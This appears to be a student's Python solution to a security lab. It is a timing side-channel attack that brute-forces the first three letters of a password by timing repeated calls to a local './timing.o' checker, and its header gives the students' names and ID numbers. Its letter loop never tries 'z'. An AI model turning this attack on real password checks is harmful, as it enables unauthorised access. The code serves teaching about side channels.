# student1 name: Shalev Abargel 200536878
# student2 name: Aviad Solganik 204541833

from builtins import range
from subprocess import call
import time

start_attack_time = time.time()
NUM_OF_TRIES = 3
TRIES_PER_LETTER = 384
PADDING = "sthruglkdroghecytnf"

start_char = ord('a')
end_char = ord('z')
real_pass = ""
# runs as many time as the number of letters we want to reveal in the password
for k in range(NUM_OF_TRIES):
    # the dictionary that contains the times of the check for each letter
    avg_dic = {}
    for i in range(TRIES_PER_LETTER):
        for j in range(start_char, end_char):
            # The check for each letter
            start_time = time.time()
            call(["./timing.o", real_pass+chr(j)+PADDING[k:]])
            end_time = time.time() - start_time
            if not avg_dic.get(chr(j)):
                avg_dic[chr(j)] = end_time
            else:
                avg_dic[chr(j)] = avg_dic.get(chr(j)) + end_time
    # here we assemble the real password according to the outcome of the checks above
    real_pass += max(avg_dic.keys(), key=lambda g: avg_dic[g])
print("The first 3 letters of the password are: " + real_pass)
end_attack_time = time.time() - start_attack_time
print("The attack length was " + str(end_attack_time) + " seconds")
